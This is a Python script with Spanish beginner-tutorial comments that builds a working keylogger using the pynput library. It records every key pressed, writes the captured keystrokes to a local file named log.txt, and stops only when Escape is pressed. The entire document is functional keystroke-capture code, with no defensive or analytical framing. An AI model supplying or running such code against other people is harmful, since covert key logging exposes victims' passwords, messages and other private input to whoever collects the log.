# Primero se instala pynput con el siguiente comando "pip install pynput"
# Luego de bajar librerias, las importamos
from pynput.keyboard import Key, Listener

#Creamos la variable keys con [] que esto lo convierte en una lista
keys = []

# Creamos la funcion presionar tecla, con el fin de que cara tecla que se pulse
# Se convierta en un texto string
def TeclaPresionada(key):
    keys.append(key)
    ConversorDeString(keys)

# La siguiente funcion guarda el string de la tecla que se oprimio en un .text llamado log
def ConversorDeString(keys):
    with open('log.txt','w') as logfile:
        for key in keys:
            key = str(key).replace("'"," ")
            logfile.write(key)

# El software se cancela con la tecla escape
def TeclaSoltada(key):
    if key == Key.esc:
        return False
    
# En este codigo se muestra cuando se prima una tecla, que funcion se realiza,
# Mientras el software esta en modo escucha la pulsacion de teclas
with Listener(on_press = TeclaPresionada, on_release= TeclaSoltada) as listener:
    listener.join()











